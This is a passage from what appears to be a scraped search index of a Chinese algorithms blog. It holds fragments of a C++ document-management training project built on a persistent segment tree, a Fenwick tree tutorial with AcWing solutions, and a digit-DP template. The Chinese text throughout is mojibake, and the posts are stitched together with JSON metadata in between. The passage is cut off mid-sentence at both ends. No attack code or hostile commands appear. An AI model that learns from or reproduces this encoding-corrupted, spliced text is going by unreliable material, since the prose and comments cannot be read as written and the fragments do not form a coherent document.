Contentè¡¨ç¤ºå†…å®¹ char line[N]; //æ–‡ä»¶æ¯ä¸€è¡Œçš„æ•°ç»„ FILE *in, *out; //æ–‡ä»¶æŒ‡é’ˆ struct Segment_Tree { //çº¿æ®µæ ‘ç»“æ„ä½“ int l, r; //lå·¦å„¿å­èŠ‚ç‚¹ï¼Œrå³å„¿å­èŠ‚ç‚¹ string content; //æ¯ä¸ªèŠ‚ç‚¹å­˜çš„å†…å®¹ } tr[N \u003c\u003c 5]; //ç©ºé—´ä¹˜32é˜²æ­¢æº¢å‡º struct Chairman_Tree_Root { //ä¸»å¸­æ ‘æ ¹ç»“æ„ä½“ int id, end; //idè¡¨ç¤ºæ ¹çš„idï¼Œ endè¡¨ç¤ºæ¯ä¸ªç‰ˆæœ¬æœ‰å¤šå°‘ä¸ªæ–‡æ¡£ } root[N]; void build(int \u0026p, int l, int r) { //å»ºæ ‘ p = ++ idx; //å»ºç«‹æ–°èŠ‚ç‚¹ if (l == r) return ; //é€’å½’ç»“æŸè¾¹ç•Œ int mid = l + r \u003e\u003e 1; //å–ä¸­ç‚¹ build(tr[p].l, l, mid), build(tr[p].r, mid + 1, r); //é€’å½’å»ºæ ‘ } void insert(int \u0026p, int pre, int pos, string x, int l, int r) { //ä¸»å¸­æ ‘æ’å…¥ p = ++ idx; //å»ºç«‹æ–°ç‰ˆæœ¬ tr[p].l = tr[pre].l, tr[p].r = tr[pre].r; //å¤åˆ¶æ—§ç‰ˆæœ¬çš„ä¿¡æ¯ tr[p].content = tr[pre].content; //å¤åˆ¶æ—§ç‰ˆæœ¬çš„å†…å®¹ if (l == r) { //æ–°æ’å†…å®¹ tr[p].content = x; return ; } int mid = l + r \u003e\u003e 1; //å–ä¸­ç‚¹ if (pos \u003c= mid){ //é€’å½’æ’å…¥ insert(tr[p].l, tr[pre].l, pos, x, l, mid); } else { insert(tr[p].r, tr[pre].r, pos, x, mid + 1, r); } } string ask(int now, int pos, int l, int r) { //ä¸»å¸­æ ‘æŸ¥è¯¢ï¼Œè¿”å›ä¸€ä¸ªstringç±»å‹å­—ç¬¦ä¸² if (l == r) return tr[now].content; //é€’å½’è¾¹ç•Œï¼Œè¿”å›ä½ç½®ä¸ºposçš„æŸ¥è¯¢ç»“æœ int mid = l + r \u003e\u003e 1; if (pos \u003c= mid) { //é€’å½’æŸ¥è¯¢ return ask(tr[now].l, pos, l, mid); } else { return ask(tr[now].r, pos, mid + 1, r); } } void Gui(); //é¢„å…ˆå®šä¹‰ä¸»ç•Œé¢å‡½æ•° void Show_List(int Show_Version); //é¢„å…ˆå®šä¹‰æ˜¾ç¤ºæ‰€æœ‰æ–‡æ¡£ void Welcome() { printf(\"\\t\\t*---------------------------------------*\\n\"); printf(\"\\t\\t|\\t \\t|\\n\"); printf(\"\\t\\t|\\t \\t|\\n\"); printf(\"\\t\\t|\\tæ¬¢è¿è®¿é—®ä¼ä¸šæ–‡æ¡£ç®¡ç†ç³»ç»Ÿ\\t|\\n\"); printf(\"\\t\\t|\\t ä½œè€…:æŸæŸæŸ1111æŸæŸæŸ \\t|\\n\"); printf(\"\\t\\t|\\t \\t|\\n\"); printf(\"\\t\\t|\\t \\t|\\n\"); printf(\"\\t\\t*---------------------------------------*\\n\"); } void back() { //è¿”å› Sleep(1000); //å»¶è¿Ÿ1ç§’ system(\"cls\"); //æ¸…å± Gui(); //æ˜¾ç¤ºä¸»ç•Œé¢ } bool Empty_Check() { //æ–‡æ¡£åˆ¤ç©º if (!root[version].end || !version) { //å½“å‰æ²¡æœ‰ä»»ä½•ç‰ˆæœ¬ æˆ– æ­¤ç‰ˆæœ¬æ²¡æœ‰æ–‡æ¡£å°±è¯´æ˜ä¸ºç©º printf(\"\\t\\t*---------------------------------------*\\n\"); printf(\"\\t\\t|\\t\\tæ–‡æ¡£ä¸ºç©º!\\t\\t|\\n\"); printf(\"\\t\\t*---------------------------------------*\\n\"); back(); } return 0; } void Show_History() { //æ˜¾ç¤ºå†å²ç‰ˆæœ¬ printf(\"\\t\\t*---------------------------------------*\\n\"); printf(\"\\t\\t|\\t\\tå½“å‰çš„å†å²ç‰ˆæœ¬å·æœ‰:\\t|\\n\"); printf(\"\\t\\t*---------------------------------------*\\n\\n\"); for (int i = 1; i \u003c= version; i ++) { printf(\"\\t\\t*---------------------------------------*\\n\"); printf(\"\\t\\t|\\t\\tç‰ˆæœ¬%d:\\t\\t\\t|\\n\", i); printf(\"\\t\\t*---------------------------------------*\\n\"); Show_List(i); //è°ƒç”¨å±•ç¤ºç¬¬iä¸ªç‰ˆæœ¬çš„æ‰€æœ‰æ–‡æ¡£å°±å¯ä»¥ï¼ŒèŠ‚çœä»£ç é‡ cout \u003c\u003c endl; } cout \u003c\u003c endl; } bool Power_Check() { //æƒé™åˆ¤æ–­ printf(\"è¾“å…¥ä½ çš„èŒåŠ¡(è€æ¿ã€å‘˜å·¥):\"); getchar(), getline(cin, Your_pos); if (Your_pos == \"è€æ¿\") { printf(\"\\t\\t*---------------------------------------*\\n\"); printf(\"\\t\\t|\\t\\tå°Šæ•¬çš„è€æ¿ï¼Œæ¬¢è¿æ‚¨!\\t|\\n\"); printf(\"\\t\\t*---------------------------------------*\\n\"); return 1; } else if (Your_pos == \"å‘˜å·¥\") { printf(\"\\t\\t*---------------------------------------*\\n\"); printf(\"\\t\\t|\\t\\tæ²¡æœ‰æƒé™è¿™ä¹ˆåš!\\t\\t|\\n\"); printf(\"\\t\\t*---------------------------------------*\\n\"); return 0; } else { printf(\"\\t\\t*---------------------------------------*\\n\"); printf(\"\\t\\t|\\t\\tèŒåŠ¡ä¸åˆæ³•!\\t\\t|\\n\"); printf(\"\\t\\t*---------------------------------------*\\n\"); return 0; } } void Show_List(int Show_Version) { //æ˜¾ç¤ºæ‰€æœ‰æ–‡æ¡£åˆ—è¡¨ Empty_Check(); //åˆ¤ç©º for (int i = 1; i \u003c= root[Show_Version].end; i ++) { //æ˜¾ç¤ºæ‰€æœ‰ç‰ˆæœ¬çš„æ‰€æœ‰æ–‡æ¡£ printf(\"\\t\\t*---------------------------------------*\\n\\t\\t\"); cout \u003c\u003c i \u003c\u003c \".\" \u003c\u003c ask(root[Show_Version].id, i, 1, N - 1) \u003c\u003c endl; //æŸ¥è¯¢ç¬¬iä¸ªç‰ˆæœ¬çš„æ–‡æ¡£ Sleep(100); } printf(\"\\t\\t*---------------------------------------*\\n\"); cout \u003c\u003c endl; } void History_Roll_Back() { //å†å²è®°å½•æŸ¥çœ‹å’Œå›æ»š Empty_Check(); //åˆ¤ç©º Show_History(); //æ˜¾ç¤ºå†å²è®°å½• printf(\"\\nè¯·è¾“å…¥ä½ è¦å›æ»šçš„å†å²ç‰ˆæœ¬å·:\"); cin \u003e\u003e history_id; if (history_id \u003e version || history_id \u003c= 0) { //åˆ¤æ–­ç‰ˆæœ¬å·åˆæ³• printf(\"\\t\\t*---------------------------------------*\\n\"); printf(\"\\t\\t|\\t\\tç‰ˆæœ¬å·ä¸åˆæ³•!\\t\\t|\\n\"); printf(\"\\t\\t*---------------------------------------*\\n\"); } else { version = history_id; printf(\"\\t\\t*----------------------------------","date":"2021-07-06","objectID":"/posts/developc%E8%AF%AD%E8%A8%80%E5%AE%9E%E8%AE%AD%E9%A1%B9%E7%9B%AE%E4%BC%81%E4%B8%9A%E6%96%87%E6%A1%A3%E7%AE%A1%E7%90%86%E4%B8%BB%E5%B8%AD%E6%A0%91%E5%AE%9E%E7%8E%B0/:0:0","tags":["å®è®­é¡¹ç›®"],"title":"cè¯­è¨€å®è®­é¡¹ç›®â€”â€”ä¼ä¸šæ–‡æ¡£ç®¡ç†(ä¸»å¸­æ ‘å®ç°)","uri":"/posts/developc%E8%AF%AD%E8%A8%80%E5%AE%9E%E8%AE%AD%E9%A1%B9%E7%9B%AE%E4%BC%81%E4%B8%9A%E6%96%87%E6%A1%A3%E7%AE%A1%E7%90%86%E4%B8%BB%E5%B8%AD%E6%A0%91%E5%AE%9E%E7%8E%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ ‘çŠ¶æ•°ç»„çš„åŸºæœ¬åº”ç”¨ï¼š $O(\\log n)$å•ç‚¹ä¿®æ”¹ã€åŒºé—´æŸ¥è¯¢ ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:1:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸç†ï¼š è®¾åŒºé—´ $[1,R]$ï¼Œå¯¹åŒºé—´å³ç«¯ç‚¹ $R$ åšäºŒè¿›åˆ¶æ‹†åˆ†ï¼Œæœ‰ï¼š $$R=2^{x_1}+2^{x_2}+\\cdots+2^{x_k}$$ å‡è®¾ $x_1\\sim x_k$ ä¸¥æ ¼å•è°ƒé€’å‡ï¼Œé‚£ä¹ˆå¯ä»¥æŠŠåŒºé—´ $[1,R]$ æ‹†åˆ†æˆ $\\log R$ ä¸ªåŒºé—´ $$[1,2^{x_1}],\\ [2^{x_1}+1,2^{x_1}+2^{x_2}],\\ \\cdots, \\ [2^{x_1}+2^{x_2}+ \\cdots + 2^{x_{k-1}}+1,2^{x_1}+2^{x_2}+\\cdots+2^{x_k}]$$ å¯ä»¥å‘ç°æ¯ä¸ªåŒºé—´çš„é•¿åº¦å°±ç­‰äºæ¯ä¸ªåŒºé—´ç»“å°¾çš„ $\\text{lowbit}$ï¼Œæ‰€ä»¥å¯ä»¥å»ºç«‹ä¸€ä¸ªæ•°ç»„ $tr$ï¼Œä¿å­˜åŒºé—´ $[R-\\text{lowbit}(R)+1,R]$ çš„å’Œï¼Œä¹Ÿå°±æ˜¯æ ‘çŠ¶æ•°ç»„ã€‚ ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:2:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æŸ¥è¯¢åŒºé—´å’Œï¼š å¯¹åŒºé—´ $[L,R]$ åªéœ€è¦æ±‚å‡º $\\sum_{i=1}^{R}-\\sum_{i=1}^{L-1}$ã€‚ æ‰€ä»¥ç›®æ ‡åªè¦è®¡ç®—åŒºé—´ $[1,i]$ çš„å’Œï¼šè®¾ $i$ çš„äºŒè¿›åˆ¶ä¸‹çš„æœ€åä¸€ä½ $1$ æ˜¯ç¬¬ $k$ ä½ï¼Œé‚£ä¹ˆåªéœ€è¦æ±‚å‡º $k-1$ ä¸ªå­èŠ‚ç‚¹çš„å’ŒåŠ ä¸Š $tr_i$ï¼Œè®¿é—®æ¯ä¸ªå­èŠ‚ç‚¹åªéœ€è¦å‡å» $\\text{lowbit}(i)$ï¼Œä¸€å…± $\\log i$ æ¬¡ï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦ä¸º $O(\\log n)$ ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:3:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š int ask(int x) { int res = 0; for (int i = x; i; i -= lowbit(i)) res += tr[i]; return res; } ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:4:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å•ç‚¹ä¿®æ”¹ å‡è®¾ä»¤ $a_i$ å¢åŠ  $c$ï¼Œè€ƒè™‘åªæœ‰ $tr_i$ åŠå…¶ç¥–å…ˆèŠ‚ç‚¹ä¿å­˜ $a_i$ çš„å€¼ï¼Œæ‰€ä»¥åªéœ€è¦æ¯æ¬¡åŠ ä¸Š $\\text{lowbit}(i)$ï¼Œå°±å¯ä»¥ä¸€ç›´ä¿®æ”¹ç¥–å…ˆèŠ‚ç‚¹ï¼Œæœ€å¤š $\\log n$ æ¬¡ï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦ä¸º $O(\\log n)$ ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:5:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š void update(int x, int c) { for (int i = x; i \u003c= n; i += lowbit(i)) tr[i] += c; } ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:6:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ ‘çŠ¶æ•°ç»„çš„æ‰©å±•åº”ç”¨ï¼š ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:7:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"$1.$æ±‚æŸä¸ªæ•°å‰é¢æˆ–åé¢æœ‰å‡ ä¸ªæ•°æ¯”å®ƒå¤§æˆ–å° AcWing 788 é€†åºå¯¹çš„æ•°é‡ åˆ†æï¼š ä»¤$tr_x$ å®šä¹‰ä¸º $x$ å‡ºç°çš„æ¬¡æ•°ï¼Œé‚£ä¹ˆ $\\sum_{i=L}^{R} tr[i]$ å°±è¡¨ç¤ºåœ¨åŒºé—´ $[L,R]$ ä¸­å‡ºç°çš„æ•°æœ‰å¤šå°‘ä¸ªï¼Œé‚£ä¹ˆç›¸å½“äºåœ¨ $x$ çš„æ•°å€¼èŒƒå›´ä¸Šå»ºç«‹ä¸€ä¸ªæ ‘çŠ¶æ•°ç»„ã€‚æ‰€ä»¥æ±‚é€†åºå¯¹æ—¶å¯ä»¥å€’åºç»Ÿè®¡ $i$ ä¹‹åæ¯” $a_i$ å°çš„æ•°ï¼Œæ¯æ¬¡å°† $tr_{a_i} + 1$ ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:8:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long #define lowbit(x) x \u0026 -x #define find(x) lower_bound(num.begin(), num.end(), x) - num.begin() using namespace std; const int N = 1e5 + 5; int n, a[N], tr[N], res; vector\u003cint\u003e num; void modify(int x, int c) { for (int i = x; i \u003c N; i += lowbit(i)) tr[i] += c; } int ask(int x) { int res = 0; for (int i = x; i; i -= lowbit(i)) res += tr[i]; return res; } signed main() { cin \u003e\u003e n; for (int i = 1; i \u003c= n; i ++) cin \u003e\u003e a[i], num.push_back(a[i]); sort(num.begin(), num.end()); num.erase(unique(num.begin(), num.end()), num.end()); for (int i = 1; i \u003c= n; i ++) { res += ask(N - 1) - ask(find(a[i]) + 1); modify(find(a[i]) + 1, 1); } cout \u003c\u003c res \u003c\u003c endl; } AcWing 241 æ¥¼å…°å›¾è…¾ åˆ†æï¼š ä¸é€†åºå¯¹ä¸€æ ·ï¼Œåœ¨å–å€¼èŒƒå›´å»ºç«‹æ ‘çŠ¶æ•°ç»„ã€‚æ±‚æ¯” $a_i$ å°ç›´æ¥ç”¨ $ask(a_i-1)$ï¼Œæ±‚æ¯” $a_i$ å¤§çš„æ•°å¯ä»¥ç”¨ $ask(n)-ask(a_i)$ è¿™ä¸€å‰ç¼€å’ŒæŠ€å·§å¤„ç†ã€‚ ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:9:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long #define lowbit(x) x \u0026 -x using namespace std; const int N = 2e5 + 5; int n, a[N], tr[N], res1, res2, high[N], low[N]; void update(int x, int c) { for (int i = x; i \u003c= n; i += lowbit(i)) tr[i] += c; } int ask(int x) { int res = 0; for (int i = x; i; i -= lowbit(i)) res += tr[i]; return res; } signed main() { cin \u003e\u003e n; for (int i = 1; i \u003c= n; i ++) cin \u003e\u003e a[i]; for (int i = 1; i \u003c= n; i ++) { high[i] = ask(n) - ask(a[i]); low[i] = ask(a[i] - 1); update(a[i], 1); } memset(tr, 0, sizeof tr); for (int i = n; i; i --) { res1 += high[i] * (ask(n) - ask(a[i])); res2 += low[i] * ask(a[i] - 1); update(a[i], 1); } cout \u003c\u003c res1 \u003c\u003c \" \" \u003c\u003c res2 \u003c\u003c endl; } ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:10:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"$2.$åŒºé—´ä¿®æ”¹ï¼Œå•ç‚¹æŸ¥è¯¢ AcWing 242 ä¸€ä¸ªç®€å•çš„æ•´æ•°é—®é¢˜ åˆ†æï¼š å¯ä»¥åˆ©ç”¨å·®åˆ†çš„æ€æƒ³ï¼Œåœ¨åŒºé—´ $[L,R]$ åŠ ä¸ŠæŸä¸€ä¸ªæ•° $c$ï¼Œé‚£ä¹ˆå°±æ˜¯åœ¨å·®åˆ†æ•°ç»„ $b$ ä¸Šå°† $b_L+c,b_{R+1}-c$ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ ‘çŠ¶æ•°ç»„ç»´æŠ¤ $a_i$ çš„å·®åˆ†ã€‚ ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:11:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long #define lowbit(x) x \u0026 -x using namespace std; const int N = 1e5 + 5; int n, m, a[N], tr[N], l, r, x, d; char op; int ask(int x) { int res = 0; for (int i = x; i; i -= lowbit(i)) res += tr[i]; return res; } void update(int x, int c) { for (int i = x; i \u003c= n; i += lowbit(i)) tr[i] += c; } signed main() { cin \u003e\u003e n \u003e\u003e m; for (int i = 1; i \u003c= n; i ++) cin \u003e\u003e a[i]; for (int i = 1; i \u003c= n; i ++) update(i, a[i] - a[i - 1]); while (m --) { cin \u003e\u003e op; if (op == 'Q') { cin \u003e\u003e x; cout \u003c\u003c ask(x) \u003c\u003c endl; } else if (op == 'C') { cin \u003e\u003e l \u003e\u003e r \u003e\u003e d; update(l, d), update(r + 1, -d); } } } ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:12:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"$3.$ åŒºé—´ä¿®æ”¹ï¼ŒåŒºé—´æŸ¥è¯¢ AcWing 243 ä¸€ä¸ªç®€å•çš„æ•´æ•°é—®é¢˜2 åˆ†æï¼š åŒºé—´ä¿®æ”¹å¯ä»¥ç”¨å·®åˆ†ç»´æŠ¤ï¼Œé‚£ä¹ˆå¦‚æœæŸ¥è¯¢åŒºé—´ $[1,R]$ï¼Œå°±ç­‰ä»·äºæ±‚ $$\\sum_{i=1}^{R}\\sum_{j=1}^{i}b_{j}=\\sum_{i=1}^{R}(R-i+1) * b_{i}=(R+1)\\sum_{i=1}^{R}b_{i}-\\sum_{i=1}^{R}i * b_{i}$$ æ‰€ä»¥åªéœ€è¦å†å¢åŠ ä¸€ä¸ªæ ‘çŠ¶æ•°ç»„ç»´æŠ¤ $i*b_i$ çš„å‰ç¼€å’Œå³å¯ã€‚ ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:13:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long #define lowbit(x) x \u0026 -x using namespace std; const int N = 1e5 + 5; int n, m, a[N], l, r, d, tr1[N], tr2[N]; char op; void update(int tr[], int x, int c) { for (int i = x; i \u003c= n; i += lowbit(i)) tr[i] += c; } int ask(int tr[], int x) { int res = 0; for (int i = x; i; i -= lowbit(i)) res += tr[i]; return res; } int sum(int x) { return ask(tr1, x) * (x + 1) - ask(tr2, x); } signed main() { cin \u003e\u003e n \u003e\u003e m; for (int i = 1; i \u003c= n; i ++) cin \u003e\u003e a[i]; for (int i = 1; i \u003c= n; i ++) update(tr2, i, i * (a[i] - a[i - 1])), update(tr1, i, a[i] - a[i - 1]); while (m --) { cin \u003e\u003e op; if (op == 'Q') { cin \u003e\u003e l \u003e\u003e r; cout \u003c\u003c sum(r) - sum(l - 1) \u003c\u003c endl; } else if (op == 'C') { cin \u003e\u003e l \u003e\u003e r \u003e\u003e d; update(tr1, l, d), update(tr2, l, d * l); update(tr1, r + 1, -d), update(tr2, r + 1, (r + 1) * -d); } } } ","date":"2021-07-02","objectID":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/:14:0","tags":["æ ‘çŠ¶æ•°ç»„"],"title":"æ ‘çŠ¶æ•°ç»„","uri":"/posts/cp%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ç”±äºç®—æ³•æé«˜è¯¾çš„æ•°ä½ DP çš„éæœç´¢åšæ³•æ¯”è¾ƒéš¾æƒ³ï¼Œæ‰€ä»¥æ€»ç»“ä¸€ä¸‹æ•°ä½ DP çš„ DFS å†™æ³•ã€‚ æ•°ä½ DP é—®é¢˜ä¸€èˆ¬ç»™å®šä¸€ä¸ªåŒºé—´ $[L,R]$ï¼Œé—®åŒºé—´æ»¡è¶³çš„æ¡ä»¶çš„æ•°æœ‰å¤šå°‘ä¸ªã€‚ å¯ä»¥åˆ©ç”¨å‰ç¼€å’Œæ¥æ±‚è§£ç­”æ¡ˆï¼š$\\sum \\limits _ {i=1}^{R} ans_i - \\sum \\limits_{i=1}^{L - 1} ans_i$ ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:0:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ¨¡æ¿ï¼š int dfs(int pos, int pre, int lead, int limit) { if (!pos) { è¾¹ç•Œæ¡ä»¶ } if (!limit \u0026\u0026 !lead \u0026\u0026 dp[pos][pre] != -1) return dp[pos][pre]; int res = 0, up = limit ? a[pos] : æ— é™åˆ¶ä½; for (int i = 0; i \u003c= up; i ++) { if (ä¸åˆæ³•æ¡ä»¶) continue; res += dfs(pos - 1, æœªå®šå‚æ•°, lead \u0026\u0026 !i, limit \u0026\u0026 i == up); } return limit ? res : (lead ? res : dp[pos][sum] = res); } int cal(int x) { memset(dp, -1, sizeof dp); len = 0; while (x) a[++ len] = x % è¿›åˆ¶, x /= è¿›åˆ¶; return dfs(len, æœªå®šå‚æ•°, 1, 1); } signed main() { cin \u003e\u003e l \u003e\u003e r; cout \u003c\u003c cal(r) - cal(l - 1) \u003c\u003c endl; } ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:1:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"$\\text{cal}$å‡½æ•°ï¼ˆä¸€èˆ¬æƒ…å†µï¼‰ï¼š æ³¨æ„æ¯æ¬¡åˆå§‹åŒ– DP æ•°ç»„ä¸º $-1$ï¼Œé•¿åº¦ $len=0$ ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:2:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸºæœ¬å‚æ•°ï¼š $len:$ æ•°ä½é•¿åº¦ï¼Œä¸€èˆ¬æ ¹æ®è¿™ä¸ªæ¥ç¡®å®šæ•°ç»„èŒƒå›´ $a_i:$ æ¯ä¸ªæ•°ä½å…·ä½“æ•°å­— è¿”å›å€¼ $\\text{return}$ æ ¹æ®é¢˜ç›®çš„åˆå§‹æ¡ä»¶æ¥ç¡®å®šå‰å¯¼ $0$ ä»¥åŠ $pre$ ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:3:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"DFS å‡½æ•°ï¼ˆä¸€èˆ¬æƒ…å†µï¼‰ï¼š å˜é‡ $res$ æ¥è®°å½•ç­”æ¡ˆï¼Œåˆå§‹åŒ–ä¸€èˆ¬ä¸º $0$ å˜é‡ $up$ è¡¨ç¤ºèƒ½æšä¸¾çš„æœ€é«˜ä½æ•° é‡‡ç”¨è®°å¿†åŒ–æœç´¢çš„æ–¹å¼ï¼š if (!limit \u0026\u0026 !lead \u0026\u0026 dp[pos][pre] != -1) return dp[pos][pre]; åªæœ‰æ— é™åˆ¶ã€æ— å‰å¯¼é›¶æ‰ç®—ï¼Œä¸ç„¶éƒ½æ˜¯æœªæœç´¢å®Œçš„æƒ…å†µã€‚ return limit ? res : dp[pos][pre] = res; å¦‚æœæœ€åè¿˜æœ‰é™åˆ¶ï¼Œé‚£ä¹ˆè¿”å› resï¼Œå¦åˆ™è¿”å› dp[pos][pre] ","date":"2021-06-25","objectID":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/:4:0","tags":["æ•°ä½ DP"],"title":"æ•°ä½DP(DFSåšæ³•)","uri":"/posts/cp%E6%95%B0%E4%BD%8Ddpdfs%E5%81%9A%E6%B3%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸºæœ¬å‚æ•°ï¼š å‡è®¾æ•°å­— $x$ ä½æ•°ä¸º $a_1\\cdots a_n$ å¿…å¡«å‚æ•°ï¼š $pos:$ è¡¨ç¤ºæ•°å­—çš„ä½æ•° ä»æœ«ä½æˆ–ç¬¬ä¸€ä½å¼€å§‹ï¼Œè¦æ ¹æ®é¢˜ç›®çš„æ•°å­—æ„é€ æ€§è´¨æ¥é€‰æ‹©é¡ºåºï¼Œä¸€èˆ¬é€‰æ‹©ä» $a_1$ åˆ° $a_n$ çš„é¡ºåºã€‚åˆå§‹ä» $len$ å¼€å§‹çš„è¯ï¼Œè¾¹ç•Œæ¡ä»¶åº”è¯¥æ˜¯ $pos = 0$ï¼Œé™åˆ¶ä½æ•°åº”è¯¥æ˜¯ $a_{pos}$ï¼ŒDFS æ—¶ $pos-1$ï¼›åˆå§‹ä»$1$å¼€å§‹çš„è¯ï¼Œè¾¹ç•Œæ¡ä»¶åº”è¯¥æ˜¯ $pos \u003e len$ï¼Œé™åˆ¶ä½æ•°åº”è¯¥æ˜¯ $a_{len - pos + 1}$ï¼ŒDFS æ—¶ $pos+1$ã€‚ä¸¤ç§éƒ½å¯ä»¥ï¼Œçœ‹ä¸ªäººä¹ æƒ¯ã€‚ $limit:$ å¯ä»¥å¡«æ•°çš„é™åˆ¶ï¼ˆæ— é™åˆ¶çš„è¯ $(limit=0)$ $0\\sim 9$ éšä¾¿å¡«ï¼Œå¦åˆ™åªèƒ½å¡«åˆ° 